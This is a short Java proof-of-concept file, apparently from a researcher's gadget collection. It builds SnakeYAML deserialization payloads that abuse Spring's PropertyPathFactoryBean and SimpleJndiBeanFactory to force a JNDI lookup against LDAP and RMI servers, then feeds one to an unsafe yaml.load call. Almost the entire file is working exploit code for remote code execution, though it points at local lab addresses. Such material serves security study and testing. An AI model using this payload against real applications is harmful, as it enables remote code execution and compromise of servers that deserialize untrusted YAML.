package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// Spring PropertyPathFactoryBean EXP
public class SpringPropertyPathFactoryBeanEXP {
    public static void main(String[] args) {
        String payload = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: \"ldap://localhost:1389/aprvde\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"ldap://localhost:1389/aprvde\"]";

        String poc = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: \"rmi://127.0.0.1:1099/nprcsj\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"rmi://127.0.0.1:1099/nprcsj\"]";

        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
